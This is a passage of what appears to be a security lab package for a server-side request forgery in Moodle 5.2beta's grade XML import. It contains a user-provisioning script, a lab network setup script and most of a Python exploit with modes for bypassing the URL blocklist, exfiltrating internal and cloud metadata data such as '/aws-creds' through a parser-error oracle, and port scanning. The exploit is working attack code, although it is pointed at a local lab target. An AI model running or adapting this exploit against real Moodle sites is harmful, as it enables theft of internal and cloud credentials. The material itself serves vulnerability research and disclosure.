]; $teacherid = user_create_user($teacher, true);

// 2. course $course = create_course((object)[
    'fullname'  => "SSRF1 Course $suffix",
    'shortname' => "ssrf1c_$suffix",
    'category'  => 1,
    'summary'   => 'ssrf1 lab',
]);

// 3. enrol as editingteacher $context = context_course::instance($course->id); $role    = $DB->get_record('role', ['shortname' => 'editingteacher']); $enrol   = enrol_get_plugin('manual'); $instance = $DB->get_record('enrol', [
    'courseid' => $course->id, 'enrol' => 'manual'
], '*', MUST_EXIST); $enrol->enrol_user($instance, $teacherid, $role->id);

// 4. capability sanity check $has_grade_import = has_capability('moodle/grade:import', $context, $teacherid); $has_xml_view     = has_capability('gradeimport/xml:view', $context, $teacherid);

echo json_encode([
    'username'         => $uname,
    'password'         => $pw,
    'user_id'          => (int)$teacherid,
    'course_id'        => (int)$course->id,
    'cap_grade_import' => (bool)$has_grade_import,
    'cap_xml_view'     => (bool)$has_xml_view,
]) . "\n"; """


def main():
    ap = argparse.ArgumentParser(description="ssrf_1 setup — provision a teacher + course")
    ap.add_argument("--container", default="moodle-app-moodle-1",
                    help="moodle docker container name")
    ap.add_argument("--base", default="http://localhost:8080",
                    help="moodle base url, written into config.json for exploit.py")
    ap.add_argument("--out", default=str(Path(__file__).resolve().parent / "config.json"),
                    help="where to write the config")
    args = ap.parse_args()

    # Random suffix so re-runs don't clash
    suffix = "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(8))
    pw = "Pw!_" + secrets.token_urlsafe(12)

    print(f"[*] provisioning teacher with random suffix={suffix}")
    proc = subprocess.run(
        ["docker", "exec", "-e", f"SUFFIX={suffix}", "-e", f"PW={pw}",
         args.container, "php", "-r", SETUP_PHP],
        capture_output=True, text=True,
    )

    if proc.returncode != 0:
        sys.stderr.write(f"[!] docker exec failed (rc={proc.returncode})\n")
        sys.stderr.write(proc.stderr)
        sys.exit(1)

    # Last line of stdout is the JSON
    last = proc.stdout.strip().splitlines()[-1]
    info = json.loads(last)

    if not info.get("cap_grade_import") or not info.get("cap_xml_view"):
        sys.stderr.write(f"[!] capability check failed: {info}\n")
        sys.exit(2)

    config = {
        "base":      args.base,
        "container": args.container,
        "target_container": "ssrf1-target",
        "target_v4": "100.64.0.10",
        "target_v6": "fc00:dead:beef::10",
        "target_dns": "ssrf1-target",
        "user":      info,
    }
    Path(args.out).write_text(json.dumps(config, indent=2))
    print(f"[+] teacher: {info['username']} / {info['password']}")
    print(f"[+] course id: {info['course_id']}")
    print(f"[+] caps: grade:import={info['cap_grade_import']} xml:view={info['cap_xml_view']}")
    print(f"[+] config written to {args.out}")


if __name__ == "__main__":
    main()

```















---
# setup_lab.sh

Code:
```bash
#!/usr/bin/env bash
# ssrf_1 lab setup.
#
# Builds the multi-service target container, creates the dual-stack docker
# network with addresses *outside* Moodle's default cURL security blocklist
# (CGN 100.64.0.0/24 + IPv6 ULA fc00:dead:beef::/64), then attaches both the
# Moodle container and the new target container to it.
#
# After running this:
#   * The target container is reachable from Moodle as
#       http://100.64.0.10/
#       http://[fc00:dead:beef::10]/
#       http://ssrf1-target/      (docker DNS)
#   * The Moodle container has gained a CGN IPv4 + ULA IPv6 + link-local IPv6
#     interface via eth1 (the new ssrf1-net).
#   * Nothing in the existing Moodle stack is altered.
#
# To roll back, run teardown_lab.sh.
set -euo pipefail

NET=ssrf1-net TARGET=ssrf1-target MOODLE=moodle-app-moodle-1 DIR="$(cd "$(dirname "$0")" && pwd)"

green() { printf "\033[32m%s\033[0m\n" "$*"; } yellow() { printf "\033[33m%s\033[0m\n" "$*"; } red()   { printf "\033[31m%s\033[0m\n" "$*"; }

if ! docker ps --format '{{.Names}}' | grep -q "^${MOODLE}$"; then red "[-] $MOODLE is not running. Start the moodle stack first." exit 1 fi

# 1. network
if ! docker network inspect "$NET" >/dev/null 2>&1; then yellow "[*] creating dual-stack network $NET (100.64.0.0/24 + fc00:dead:beef::/64)" docker network create \
    --ipv6 \
    --subnet=100.64.0.0/24 \
    --subnet=fc00:dead:beef::/64 \
    "$NET" >/dev/null
  green "[+] network created" else yellow "[*] network $NET already exists" fi

# 2. attach moodle
if docker inspect "$MOODLE" --format '{{json .NetworkSettings.Networks}}' | grep -q "$NET"; then yellow "[*] $MOODLE already attached to $NET" else yellow "[*] attaching $MOODLE to $NET (100.64.0.2 / fc00:dead:beef::2)" docker network connect --ip 100.64.0.2 --ip6 fc00:dead:beef::2 "$NET" "$MOODLE" green "[+] moodle attached" fi

# 3. build target image
yellow "[*] building target image ssrf1-target:latest" docker build -q -t ssrf1-target:latest "$DIR/targets" >/dev/null green "[+] image built"

# 4. start target container
docker rm -f "$TARGET" >/dev/null 2>&1 || true yellow "[*] starting $TARGET on $NET (100.64.0.10 / fc00:dead:beef::10)" docker run -d --rm \
  --name "$TARGET" \
  --network "$NET" \
  --ip 100.64.0.10 \
  --ip6 fc00:dead:beef::10 \
  ssrf1-target:latest >/dev/null green "[+] target running"

sleep 1

# 5. quick reachability sanity check from inside moodle
yellow "[*] sanity-checking reachability from inside $MOODLE..." docker exec "$MOODLE" php -r ' $tests = [
    "tcp://100.64.0.10:80"            => "CGN IPv4",
    "tcp://[fc00:dead:beef::10]:80"   => "IPv6 ULA",
]; foreach ($tests as $tgt => $label) {
    $s = @stream_socket_client($tgt, $en, $es, 2);
    echo "  $label $tgt = " . ($s ? "OK" : "errno=$en err=$es") . PHP_EOL;
    if ($s) fclose($s);
} '

green "[+] lab ready" echo echo "Target reachable from moodle as:" echo "  http://100.64.0.10/                       (IPv4 CGN — bypasses helper)" echo "  http://[fc00:dead:beef::10]/              (IPv6 ULA — bypasses helper)" echo "  http://ssrf1-target/                      (docker DNS — resolves to CGN)" echo echo "Tail target logs with:" echo "  docker logs -f $TARGET" echo echo "Run the exploit:" echo "  ./venv/bin/python exploit.py --setup-only        # creates teacher account" echo "  ./venv/bin/python exploit.py validate            # prove SSRF fires" echo "  ./venv/bin/python exploit.py bypass-survey       # what works, what doesn't" echo "  ./venv/bin/python exploit.py exfil --path /aws-creds" echo "  ./venv/bin/python exploit.py portscan --host ssrf1-target"

```















---
# exploit.py

Code:
```python
#!/usr/bin/env python3 """ ssrf_1 — Moodle 5.2beta grade-import XML SSRF exploit.

Vulnerability ------------- public/grade/import/xml/import.php takes a user-supplied `url` parameter (PARAM_URL only) and passes it directly to download_file_content(). The caller needs `moodle/grade:import` + `gradeimport/xml:view` (any teacher in any course) and the request hits curl::get() which routes through core\\files\\curl_security_helper. That helper IS enabled by default in Moodle 5.2beta, but its default blocklist has gaps:

  * IPv6 link-local (fe80::/10) and ULA (fc00::/7, fd00::/8) — none blocked
  * IPv4 CGN (100.64.0.0/10) — not blocked
  * Almost all of 169.254.0.0/16 — only the literal 169.254.169.254 is blocked
  * Alibaba metadata (100.100.100.200), Oracle metadata (192.0.0.192)
  * Hostnames pointing to any of the above (DNS resolution check is only as
    good as the IP blocklist behind it)

The endpoint is also a partially-readable oracle, not blind:

  1. Helper-blocked          → response error: "Cannot read file (URL)"
                                + curl errno set to "Unknown cURL error"
  2. Connection failed       → same Moodle exception, but curl errno is the
                                real connect error (timed out, refused, ...)
  3. Connection succeeded but body is non-XML
                             → "errorduringimport" + parser error string
  4. Connection succeeded and body parses as Moodle grade XML
                             → the XML <assignment> element value is *echoed*
                                back inside Moodle's translated error message:
                                "Error - idnumber 'X' from the import file
                                does not match any grade item."
                                ← this is the EXFIL primitive

The bounce technique exploits #4: hit a redirect-bouncer that wraps any attacker-chosen value in valid grade XML, and read it out of the parser error. The bouncer is the `/xml-leak?val=...` endpoint on the lab target.

Modes ----- validate         Sanity-check that the SSRF fires. Hits the lab target's
                   /exfil endpoint via every bypass technique and prints what
                   the target's stderr saw vs what Moodle's error said.

  bypass-survey    Run the full battery of bypass tests against the helper.
                   Categorises each as: blocked-by-helper / connect-ok /
                   not-allowed-port. Reports a 3-column matrix.

  exfil --path P   Fetch /aws-creds, /admin, /alibaba/meta-data/instance,
                   /grades-xml, etc. on the lab target via the SSRF and
                   demonstrate which leak data and which don't.

  target URL       One-shot SSRF GET to URL. Useful for ad-hoc probes.

  portscan         Timing-based port scan against an arbitrary host (only
                   ports 80/443 are reachable through the helper, so this
                   is mostly a calibration demo unless your target is
                   actually serving HTTP on those ports).

The exploit deliberately uses the existing teacher account stashed in config.json by setup_user.py. Re-run setup_user.py to provision a fresh one. """ import argparse import json import re import statistics import sys import time from html import unescape from pathlib import Path from urllib.parse import quote, urlparse

try:
    import requests
except ImportError:
    sys.exit("error: install requests via ./venv/bin/pip install requests")

requests.packages.urllib3.disable_warnings()

CONFIG_PATH = Path(__file__).resolve().parent / "config.json"

# ─── tty colors ──────────────────────────────────────────────────────────────
if sys.stdout.isatty():
    R, G, Y, C, M, D, X, BOLD = ("\033[31m", "\033[32m", "\033[33m",
                                 "\033[36m", "\033[35m", "\033[2m",
                                 "\033[0m", "\033[1m")
else:
    R = G = Y = C = M = D = X = BOLD = ""

def step(msg):  print(f"\n{C}┌─ {BOLD}{msg}{X}{C} ─{X}") def info(msg):  print(f"{C}│{X} {msg}") def ok(msg):    print(f"{C}│{X} {G}✓{X} {msg}") def bad(msg):   print(f"{C}│{X} {R}✗{X} {msg}") def warn(msg):  print(f"{C}│{X} {Y}!{X} {msg}") def foot():     print(f"{C}└─{X}")


# ─── moodle plumbing ─────────────────────────────────────────────────────────
def load_config():
    if not CONFIG_PATH.exists():
        sys.exit(f"error: config.json not found. Run setup_user.py first.")
    return json.loads(CONFIG_PATH.read_text())


def login(base, username, password):
    """Log in to Moodle and return an authenticated requests.Session."""
    sess = requests.Session()
    sess.verify = False
    r = sess.get(f"{base}/login/index.php", timeout=10)
    r.raise_for_status()
    m = re.search(r'name="logintoken" value="([^"]+)"', r.text)
    if not m:
        sys.exit("could not extract logintoken from login page")
    logintoken = m.group(1)
    r = sess.post(
        f"{base}/login/index.php",
        data={"username": username, "password": password, "logintoken": logintoken},
        allow_redirects=True, timeout=10,
    )
    if "loginerrors" in r.text or "Invalid login" in r.text:
        sys.exit("login failed — check credentials in config.json")
    return sess


# ─── the SSRF primitive ──────────────────────────────────────────────────────
PROBE_RE_CANNOTREAD = re.compile(r'errormessage[^>]*>([^<]+)', re.I) PROBE_RE_FATAL = re.compile(r'<p\s+class="errormessage"[^>]*>([^<]*)</p>', re.I) PROBE_RE_LANG = re.compile(r'(Error\s*-\s*[^<]+)', re.I)


def ssrf(sess, base, course_id, target_url, timeout=20.0):
    """Fire one SSRF via the grade XML import endpoint.

    Returns dict with keys:
        elapsed       float seconds the HTTP request to Moodle took
        moodle_status int HTTP status from Moodle
        verdict       one of: BLOCKED, CONNECT_FAIL, NON_XML, XML_LEAK,
                              IMPORTED, ALLOWED_OTHER, UNKNOWN
        message       extracted Moodle error/parser message (string)
        leaked        if XML_LEAK, the value the parser echoed back
    """
    url = f"{base}/grade/import/xml/import.php"
    params = {"id": course_id, "url": target_url}
    t0 = time.time()
    try:
        r = sess.get(url, params=params, timeout=timeout, allow_redirects=False)
    except requests.exceptions.Timeout:
        return {"elapsed": time.time() - t0, "moodle_status": 0,
                "verdict": "MOODLE_TIMEOUT", "message": "moodle did not respond",
                "leaked": None}
    elapsed = time.time() - t0
    body = r.text

    # Two distinct error messages bubble up to the HTML page:
    #   1) cannotreadfile  → "Cannot read file (URL)"
    #   2) errorduringimport → "Error - <parser message>"
    msg = ""
    fatal = PROBE_RE_FATAL.search(body)
    if fatal:
        msg = unescape(fatal.group(1)).strip()

    # The parser error string is rendered as a separate <p> too. Try to find it.
    parser_err = ""
    for m in PROBE_RE_LANG.finditer(body):
        candidate = unescape(m.group(1)).strip()
        if "Error" in candidate and "Cannot read file" not in candidate:
            parser_err = candidate
            break

    leaked = None
    if "Cannot read file" in msg:
        # Distinguish helper-blocked vs connect-failed using elapsed time:
        # the helper rejects URLs in well under 100 ms; real curl connect
        # attempts to unreachable hosts take > 500 ms (TCP retransmits +
        # connect timeout). Helper-blocked also returns the URL in the
        # error message, while curl-failed returns the URL too — but the
        # timing is the only reliable signal short of inspecting logs.
        if elapsed < 0.300:
            verdict = "HELPER_BLOCKED"
        else:
            verdict = "CONNECT_FAILED"  # request issued, target unreachable
    elif "bad XML format" in (parser_err or msg):
        verdict = "NON_XML"
    elif parser_err and "idnumber" in parser_err:
        # Pull the leaked value out of:
        #   "Error - idnumber 'XXXX' from the import file does not match..."
        leak = re.search(r"idnumber\s*'([^']*)'", parser_err)
        if leak:
            leaked = leak.group(1)
            verdict = "XML_LEAK"
        else:
            verdict = "ALLOWED_OTHER"
    elif parser_err:
        verdict = "ALLOWED_OTHER"
    elif "Importing data" in body or "grade items found" in body:
        verdict = "IMPORTED"
    else:
        verdict = "UNKNOWN"

    return {
        "elapsed":       round(elapsed, 4),
        "moodle_status": r.status_code,
        "verdict":       verdict,
        "message":       msg or parser_err or "",
        "leaked":        leaked,
    }


# ─── modes ──────────────────────────────────────────────────────────────────
def cmd_validate(args, sess, cfg):
    """Hit /exfil via every bypass technique. Then read the target log to
    confirm which ones actually arrived at the target."""
    base, cid = cfg["base"], cfg["user"]["course_id"]
    tag = f"validate_{int(time.time())}"
    techniques = [
        ("CGN IPv4 direct",   f"http://{cfg['target_v4']}/exfil?t={tag}-cgn"),
        # NOTE: bracketed IPv6 URLs are stripped to '' by Moodle's PARAM_URL
        # cleaner before download_file_content() ever sees them. The helper
        # itself will happily fetch ULA/link-local IPv6 (we proved that with
        # a direct call to download_file_content), but THIS endpoint blocks
        # it at the PARAM_URL stage. Keeping the test to demonstrate the
        # limitation; verdict will be BLOCKED_OR_CONNECT_FAIL with empty URL.
        ("IPv6 ULA (PARAM_URL strip)", f"http://[{cfg['target_v6']}]/exfil?t={tag}-ula"),
        ("docker DNS name",   f"http://{cfg['target_dns']}/exfil?t={tag}-dns"),
    ]

    step("Firing SSRF probes via /exfil on lab target")
    for label, url in techniques:
        info(f"{label:<22}  url={url}")
        res = ssrf(sess, base, cid, url)
        if res["verdict"] in ("NON_XML", "ALLOWED_OTHER", "XML_LEAK", "IMPORTED"):
            ok(f"{label:<22}  HTTP={res['moodle_status']} verdict={res['verdict']} elapsed={res['elapsed']}s")
        else:
            bad(f"{label:<22}  verdict={res['verdict']} message={res['message']}")
    foot()

    step(f"Reading target container logs for tag={tag}")
    import subprocess
    logs = subprocess.run(
        ["docker", "logs", "--tail", "200", cfg["target_container"]],
        capture_output=True, text=True,
    )
    hits = [ln for ln in (logs.stdout + logs.stderr).splitlines() if tag in ln]
    if not hits:
        bad("no exfil markers found in target logs")
    else:
        ok(f"{len(hits)} hit(s) recorded by target:")
        for h in hits:
            print(f"{C}│{X}   {D}{h}{X}")
    foot()


def helper_check_batch(container, urls):
    """Run a batch URL list through Moodle's curl_security_helper inside the
    container and return {url: True/False} where True means BLOCKED.
    This is the GROUND TRUTH — bypassing all the noise of HTTP responses,
    PARAM_URL strip, target reachability, etc."""
    import subprocess, json
    php = """
define('CLI_SCRIPT', true); require('/var/www/moodle/config.php'); $urls = json_decode(getenv('URLS'), true); $h = new \\core\\files\\curl_security_helper(); $out = []; foreach ($urls as $u) {
    // Also test what PARAM_URL does to it (the entry point cleaner)
    $cleaned = clean_param($u, PARAM_URL);
    $out[$u] = [
        'helper_blocks' => (bool)$h->url_is_blocked($u),
        'param_url'     => $cleaned,
        'param_strips'  => ($cleaned === ''),
    ];
} echo json_encode($out); """
    proc = subprocess.run(
        ["docker", "exec", "-e", f"URLS={json.dumps(urls)}", container, "php", "-r", php],
        capture_output=True, text=True,
    )
    if proc.returncode != 0:
        sys.stderr.write(proc.stderr)
        return {}
    return json.loads(proc.stdout)


def cmd_bypass_survey(args, sess, cfg):
    """Run a wide battery of URLs through TWO checks:

      1. Ground truth: query Moodle's curl_security_helper directly via
         docker exec. This tells us authoritatively whether the helper
         would let this URL through, and whether PARAM_URL strips it.
      2. Live HTTP: actually fire the SSRF through the grade-import
         endpoint to confirm the real-world behaviour.

    For "should pass" cases that point at the lab target, we ADDITIONALLY
    check whether the target's stderr saw the request — that's the only
    way to be 100% sure the request reached the target (vs. the parser
    just falling over on a non-XML body returned for some other reason)."""
    import subprocess, time as _time
    base, cid = cfg["base"], cfg["user"]["course_id"]
    v4 = cfg["target_v4"]
    v6 = cfg["target_v6"]
    container = cfg["container"]
    target_container = cfg["target_container"]

    tag = f"survey_{int(_time.time())}"
    cases = [
        # ── should be blocked by the helper ─────────────────────────────────
        ("loopback 127.0.0.1",            f"http://127.0.0.1/?t={tag}",            False),
        ("string 'localhost'",            f"http://localhost/?t={tag}",            False),
        ("LOCALHOST uppercase",           f"http://LOCALHOST/?t={tag}",            False),
        ("decimal int IP",                f"http://2130706433/?t={tag}",           False),
        ("hex IP 0x7f000001",             f"http://0x7f000001/?t={tag}",           False),
        ("RFC1918 192.168.1.1",           f"http://192.168.1.1/?t={tag}",          False),
        ("docker bridge 172.22.0.2",      f"http://172.22.0.2/?t={tag}",           False),
        ("AWS IMDSv1 .169.254",           f"http://169.254.169.254/?t={tag}",      False),
        # ── should be blocked by PARAM_URL (entry point sanitiser) ──────────
        ("IPv6 [::1] (PARAM_URL strip)",  f"http://[::1]/?t={tag}",                False),
        ("IPv4-mapped IPv6",              f"http://[::ffff:127.0.0.1]/?t={tag}",   False),
        ("IPv6 ULA bracketed",            f"http://[{v6}]/exfil?t={tag}-ula",      False),
        # ── should be blocked by port allowlist ─────────────────────────────
        ("port 8080 (not allowed)",       f"http://{v4}:8080/?t={tag}",            False),
        ("port 6379 (not allowed)",       f"http://{v4}:6379/?t={tag}",            False),
        # ── should pass — confirmed by lab target log ───────────────────────
        ("CGN IPv4 100.64.0.10",          f"http://{v4}/exfil?t={tag}-cgn",        True),
        ("docker DNS ssrf1-target",       f"http://{cfg['target_dns']}/exfil?t={tag}-dns", True),
        # ── should pass — no service to confirm but helper allows ──────────
        ("link-local IPv4 169.254.0.1",   f"http://169.254.0.1/?t={tag}",          True),
        ("link-local IPv4 .169.253",      f"http://169.254.169.253/?t={tag}",      True),
        ("Alibaba metadata 100.100.100.200", f"http://100.100.100.200/?t={tag}",   True),
        ("Oracle metadata 192.0.0.192",   f"http://192.0.0.192/?t={tag}",          True),
        ("CGN top 100.127.255.254",       f"http://100.127.255.254/?t={tag}",      True),
        ("public example.com",            f"http://example.com/?t={tag}",          True),
    ]

    # 1. ground truth via docker exec
    step("Step 1 — querying Moodle's security helper directly (ground truth)")
    info("running php -r inside the container...")
    truth = helper_check_batch(container, [u for _, u, _ in cases])
    ok(f"queried {len(truth)} URLs")
    foot()

    # Verdicts that mean "the SSRF actually fired through the helper":
    SUCCESS_VERDICTS = {"NON_XML", "XML_LEAK", "ALLOWED_OTHER", "IMPORTED"}
    # Verdicts that mean "helper let it through, network was the problem":
    PARTIAL_VERDICTS = {"CONNECT_FAILED", "MOODLE_TIMEOUT"}
    # Verdicts that mean "definitively blocked":
    FAIL_VERDICTS    = {"HELPER_BLOCKED"}

    def colour_helper(blocks):
        # Green = allowed (good for attacker), red = blocked
        return f"{R}BLOCK{X}" if blocks else f"{G}pass {X}"

    def colour_param(strips):
        return f"{R}STRIP{X}" if strips else f"{G}pass {X}"

    def colour_live(verdict):
        if verdict in SUCCESS_VERDICTS:
            return f"{G}{verdict:<22}{X}"
        if verdict in PARTIAL_VERDICTS:
            return f"{Y}{verdict:<22}{X}"
        if verdict in FAIL_VERDICTS:
            return f"{R}{verdict:<22}{X}"
        return f"{D}{verdict:<22}{X}"

    def colour_elapsed(elapsed, verdict):
        # >5s usually means curl waited on a connect timeout — yellow
        if elapsed > 5.0:
            return f"{Y}{elapsed:>7.2f}s{X}"
        if verdict in SUCCESS_VERDICTS:
            return f"{G}{elapsed:>7.2f}s{X}"
        if verdict in FAIL_VERDICTS:
            return f"{R}{elapsed:>7.2f}s{X}"
        return f"{elapsed:>7.2f}s"

    # 2. live SSRF
    step("Step 2 — firing the SSRF live for each URL")
    print(f"{C}│{X}  {'exp':<5} {'helper':<6} {'PARAM':<6} {'live':<22} {'elapsed':>8}  label")
    print(f"{C}│{X}  " + "─" * 92)
    for label, url, should_pass in cases:
        res = ssrf(sess, base, cid, url, timeout=35)
        t = truth.get(url, {})
        helper_blocks = t.get("helper_blocks")
        param_strips  = t.get("param_strips")
        verdict = res["verdict"]
        elapsed = res["elapsed"]

        # Compose the "would the SSRF actually fire" verdict from ground truth
        if param_strips:
            ground = "param-strip"
        elif helper_blocks:
            ground = "helper-block"
        else:
            ground = "PASS"

        exp = "PASS " if should_pass else "BLOCK"
        match = (should_pass and ground == "PASS") or (not should_pass and ground != "PASS")
        # exp column: green if my expectation matched ground truth, red otherwise
        exp_str = f"{G}{exp}{X}" if match else f"{R}{exp}{X}"

        print(f"{C}│{X}  {exp_str} "
              f"{colour_helper(helper_blocks)} "
              f"{colour_param(param_strips)} "
              f"{colour_live(verdict)} "
              f"{colour_elapsed(elapsed, verdict)}  {label}")
    foot()

    # 3. cross-reference target logs for the "should pass" cases
    step("Step 3 — cross-referencing lab target logs for passes that hit it")
    logs = subprocess.run(
        ["docker", "logs", "--tail", "200", target_container],
        capture_output=True, text=True,
    )
    hits = [ln for ln in (logs.stdout + logs.stderr).splitlines() if tag in ln]
    if hits:
        ok(f"target logged {len(hits)} hit(s) tagged {tag}:")
        for h in hits:
            print(f"{C}│{X}    {D}{h}{X}")
    else:
        warn("no hits tagged this run found in target logs")
    foot()

    print()
    print(f"{BOLD}Column meaning:{X}")
    print(f"  {D}exp{X}     = expected outcome (PASS = SSRF fires; BLOCK = doesn't)")
    print(f"  {D}helper{X}  = ground-truth from curl_security_helper::url_is_blocked()")
    print(f"  {D}PARAM{X}   = what clean_param(..., PARAM_URL) does (STRIP = blanked)")
    print(f"  {D}live{X}    = verdict returned by the actual HTTP exploit")
    print(f"  {D}elapsed{X} = wall-clock seconds for the live HTTP request")
    print()
    print(f"{BOLD}Colour legend (read across the row, attacker's perspective):{X}")
    print(f"  {G}green{X}  = bypass works for this column")
    print(f"           helper=pass → helper allows the URL")
    print(f"           PARAM=pass  → PARAM_URL keeps the URL intact")
    print(f"           live verdict ∈ {{NON_XML, XML_LEAK, ALLOWED_OTHER}} → SSRF fired AND target responded")
    print(f"           elapsed     → fast successful fetch")
    print(f"  {Y}yellow{X} = partial bypass")
    print(f"           live verdict ∈ {{CONNECT_FAILED, MOODLE_TIMEOUT}} → helper let it through, but the")
    print(f"                         target is unreachable / not running. The SSRF DID fire — the")
    print(f"                         attacker's curl handle made the connect attempt. This is a real")
    print(f"                         bypass; the connect-fail is environmental, not Moodle blocking it.")
    print(f"           elapsed > 5s → curl waited on a timeout (also a sign of bypass + dead target)")
    print(f"  {R}red{X}    = blocked")
    print(f"           helper=BLOCK → helper rejects the URL")
    print(f"           PARAM=STRIP  → PARAM_URL blanks the URL before the helper even sees it")
    print(f"           live=HELPER_BLOCKED → exploit was rejected before any network activity")
    print(f"           exp=red      → my expectation in the test table didn't match ground truth")
    print()
    print(f"{BOLD}Reading the rows:{X}")
    print(f"  • A row that's all green = clean bypass (and either reaches target or hits a real service)")
    print(f"  • Green helper + green PARAM + yellow live = bypass confirmed but no service to talk to")
    print(f"  • Any red cell = something blocks this technique on this endpoint")


def cmd_exfil(args, sess, cfg):
    """Fetch internal-looking data via the SSRF and display the result.

    Three exfil techniques are demonstrated:

      1) Direct fetch of /admin, /aws-creds, /alibaba/meta-data/instance.
         These return the data, but Moodle's parser only sees "bad XML"
         and the response body is NOT echoed back. We confirm reachability
         from the target container's stderr log.

      2) Direct fetch of /grades-xml. The target returns valid grade XML
         containing a SECRET inside <assignment>. The parser extracts the
         element value and echoes it through the error string.
         → first true exfiltration channel.

      3) The /xml-leak?val=DATA bouncer: any value of `val` is wrapped in
         valid grade XML and bounced back, so we can exfiltrate arbitrary
         attacker-supplied data via the parser error.
         → not strictly an "internal exfil" but proves the oracle works
         for any value we can route through the bouncer.
    """
    import subprocess
    base, cid = cfg["base"], cfg["user"]["course_id"]
    v4 = cfg["target_v4"]
    paths = args.paths or [
        "/admin",
        "/aws-creds",
        "/alibaba/meta-data/instance",
        "/grades-xml",
    ]
    step("Exfil probes")
    for p in paths:
        url = f"http://{v4}{p}"
        info(f"GET {url}")
        res = ssrf(sess, base, cid, url, timeout=15)
        if res["verdict"] == "XML_LEAK":
            ok(f"verdict=XML_LEAK  ECHOED VALUE = {BOLD}{M}{res['leaked']}{X}")
            info(f"  parser_msg = {D}{res['message']}{X}")
        elif res["verdict"] == "NON_XML":
            warn(f"verdict=NON_XML  → response body received but body is not XML")
            info(f"  parser_msg = {D}{res['message']}{X}")
            info(f"  (target served the data, but it's not echoed; verify via target logs)")
        elif res["verdict"] == "BLOCKED_OR_CONNECT_FAIL":
            bad(f"verdict=BLOCKED_OR_CONNECT_FAIL — moodle err = {res['message']}")
        else:
            warn(f"verdict={res['verdict']}  message={res['message']}")
    foot()

    # bouncer demo: leak any attacker-controlled value via the XML wrap helper
    step("XML-bounce oracle: exfil arbitrary value through /xml-leak")
    secret = args.bounce or "ssrf1{bounced_through_oracle}"
    url = f"http://{v4}/xml-leak?val={quote(secret)}"
    info(f"GET {url}")
    res = ssrf(sess, base, cid, url)
    if res["verdict"] == "XML_LEAK":
        ok(f"ECHOED VALUE = {BOLD}{M}{res['leaked']}{X}")
        ok(f"matches input = {res['leaked'] == secret}")
    else:
        bad(f"verdict={res['verdict']} — bounce didn't work")
    foot()

    # show the target's perspective
    step("Target container view (last 30 lines)")
    logs = subprocess.run(
        ["docker", "logs", "--tail", "30", cfg["target_container"]],
        capture_output=True, text=True,
    )
    for ln in (logs.stdout + logs.stderr).splitlines()[-30:]:
        print(f"{C}│{X}  {D}{ln}{X}")
    foot()


def cmd_target(args, sess, cfg):
    base, cid = cfg["base"], cfg["user"]["course_id"]
    step(f"single SSRF GET → {args.url}")
    res = ssrf(sess, base, cid, args.url, timeout=args.timeout)
    info(f"elapsed = {res['elapsed']}s")
    info(f"verdict = {res['verdict']}")
    info(f"message = {res['message']}")
    if res["leaked"] is not None:
        ok(f"ECHOED VALUE = {BOLD}{M}{res['leaked']}{X}")
    foot()


def cmd_portscan(args, sess, cfg):
    """Timing-based port scan with helper-aware classification.

    The cURL security helper restricts ports to its allowlist (80/443 by
    default), so any non-allowlisted port returns immediately as "helper
    rejected" — independent of whether the port is open. This scanner uses
    Moodle's helper as ground truth to distinguish:

       helper-rejected (port outside allowlist)
       closed/refused  (helper allowed, curl got TCP RST in <baseline)
       OPEN (fast HTTP) (helper allowed, got a real HTTP response back fast)
       OPEN (slow)     (helper allowed, response time > threshold)
       OPEN|FILTERED   (helper allowed, hard timeout — port may speak non-HTTP)

    With the default port allowlist [80, 443], you'll get useful scan results
    only for those two ports against any host. To do meaningful internal
    portscanning you need an admin to have widened curlsecurityallowedport.
    """
    base, cid = cfg["base"], cfg["user"]["course_id"]
    container = cfg["container"]
    ports = parse_ports(args.ports)
    cal_ports = [39981, 39982, 39983]

    # 1. ground truth: which ports does the helper actually allow?
    step(f"querying helper allowlist via docker exec")
    test_urls = [f"http://{args.host}:{p}/" for p in ports + cal_ports]
    truth = helper_check_batch(container, test_urls)
    allowed_ports = [p for p in ports if not truth.get(f"http://{args.host}:{p}/", {}).get("helper_blocks", True)]
    blocked_ports = [p for p in ports if p not in allowed_ports]
    ok(f"helper-allowed: {allowed_ports}")
    ok(f"helper-blocked: {blocked_ports}")
    foot()

    if not allowed_ports:
        warn("no ports passed the helper — adjust curlsecurityallowedport on the target")
        return

    # 2. calibration: measure how long a "fast HTTP" request takes against
    #    the lab target (a known reachable HTTP responder). Anything slower
    #    than baseline + a margin counts as a slow service.
    #
    #    NOTE: We deliberately do NOT calibrate against an unreachable host
    #    here — that would burn a full curl timeout (~30s) per sample and
    #    can also exhaust Moodle's apache worker pool, causing subsequent
    #    requests to queue. The "fast baseline + threshold" strategy is
    #    enough for distinguishing fast HTTP from slow HTTP.
    step(f"calibration — 4 fast samples against lab target")
    samples = []
    for _ in range(4):
        r = ssrf(sess, base, cid, f"http://{cfg['target_v4']}/", timeout=args.timeout)
        samples.append(r["elapsed"])
        time.sleep(args.delay)

    baseline = statistics.median(samples)
    threshold = baseline + 0.500   # 500 ms margin = anything slower is "slow service"
    ok(f"baseline samples = {[f'{x:.3f}' for x in samples]}")
    ok(f"baseline (median) = {baseline:.3f}s, threshold = {threshold:.3f}s")
    foot()

    # 3. scan
    step(f"scanning {len(ports)} port(s) on {args.host}")
    print(f"{C}│{X}  {'port':<7}{'helper':<10}{'samples':<32}{'median':>9}  verdict")
    print(f"{C}│{X}  " + "─" * 84)
    for p in ports:
        url = f"http://{args.host}:{p}/"
        helper_blocks = truth.get(url, {}).get("helper_blocks", True)
        if helper_blocks:
            print(f"{C}│{X}  {p:<7}{R}BLOCK{X}     {D}— skipped (helper rejects port){X}")
            continue
        times = []
        last_verdict = ""
        for _ in range(args.samples):
            r = ssrf(sess, base, cid, url, timeout=args.timeout)
            times.append(r["elapsed"])
            last_verdict = r["verdict"]
            time.sleep(args.delay)
        med = statistics.median(times)
        if last_verdict in ("NON_XML", "ALLOWED_OTHER", "XML_LEAK"):
            label, col = "OPEN (fast HTTP)", G
        elif last_verdict == "MOODLE_TIMEOUT":
            label, col = "OPEN|FILTERED (timeout)", Y
        elif med > threshold:
            label, col = "OPEN (slow)", G
        else:
            label, col = "closed/refused", D
        sample_str = " ".join(f"{x:.3f}" for x in times)
        print(f"{C}│{X}  {p:<7}{G}allow{X}     {sample_str:<32}{med:>7.3f}s  {col}{label}{X}")
    foot()


def parse_ports(s):
    out = []
    for part in s.split(","):
        part = part.strip()
        if "-" in part:
            a, b = part.split("-", 1)
            out.extend(range(int(a), int(b) + 1))
        else:
            out.append(int(part))
    return sorted(set(out))


